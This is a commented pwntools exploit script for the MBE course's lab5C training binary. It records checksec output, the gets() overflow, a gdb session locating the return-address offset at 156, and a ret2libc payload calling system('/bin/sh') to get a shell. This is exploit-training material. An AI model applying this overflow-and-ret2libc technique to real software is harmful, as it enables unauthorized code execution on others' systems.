# -*- coding: utf-8 -*-
# NX on
'''
❯ checksec lab5C
[*] '/home/karmaz/MBE/lab5/lab5C'
    Arch:     i386-32-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
'''

# There is gets() - vulnerable to BO
# and 128 bytes will be stored in global_str variable which can store arguments for ret2libc attack
'''
char global_str[128]; <===

/* reads a string, copies it to a global */
void copytoglobal()
{
    char buffer[128] = {0};
    gets(buffer);               <===
    memcpy(global_str, buffer, 128);
}
'''

# Control EIP 
'''
gdb-peda$ pattern create 200
'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA'
gdb-peda$ r
Starting program: /home/karmaz/MBE/lab5/lab5C 
I included libc for you...
Can you ROP to system()?
AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA

Program received signal SIGSEGV, Segmentation fault.
[----------------------------------registers-----------------------------------]
EAX: 0xffffcca4 ("AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")
EBX: 0x41416d41 ('AmAA')
ECX: 0x0 
EDX: 0x1f 
ESI: 0x6f414152 ('RAAo')
EDI: 0x41534141 ('AASA')
EBP: 0x41417041 ('ApAA')
ESP: 0xffffcd40 ("AAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")
EIP: 0x71414154 ('TAAq')
EFLAGS: 0x10282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x71414154
[------------------------------------stack-------------------------------------]
0000| 0xffffcd40 ("AAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")
0004| 0xffffcd44 ("ArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")
0008| 0xffffcd48 ("VAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")
0012| 0xffffcd4c ("AAWAAuAAXAAvAAYAAwAAZAAxAAyA")
0016| 0xffffcd50 ("AuAAXAAvAAYAAwAAZAAxAAyA")
0020| 0xffffcd54 ("XAAvAAYAAwAAZAAxAAyA")
0024| 0xffffcd58 ("AAYAAwAAZAAxAAyA")
0028| 0xffffcd5c ("AwAAZAAxAAyA")
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x71414154 in ?? ()
'''
# EIP Offset is @ 156
'''
0x71414154 in ?? ()
gdb-peda$ pattern offset 0x71414154
1900101972 found at offset: 156
'''
# Get the piecese:
#  eip => [system()] [trash_for_return] ["/bin/sh"]
'''
gdb-peda$ find "/bin/sh"
Searching for '/bin/sh' in: None ranges
Found 1 results, display max 1 items:
libc : 0xf7f4e352 ("/bin/sh")
gdb-peda$ p system
$1 = {<text variable, no debug info>} 0xf7e01830 <system>
gdb-peda$
'''

# Exploit ret2libc


from pwn import *
#print "A" * 156 + p32(0xf7e01830) + "AAAA" + p32(0xf7f4e352)

padding = 156 * "A"
system_addr = p32(0xf7e01830)
trash_ret = "AAAA"
arg1 = p32(0xf7f4e352) # "/bin/sh"

buf = padding + system_addr + trash_ret + arg1

p = process("./lab5C")
p.recvuntil("system()?")
p.sendline(buf)
p.interactive()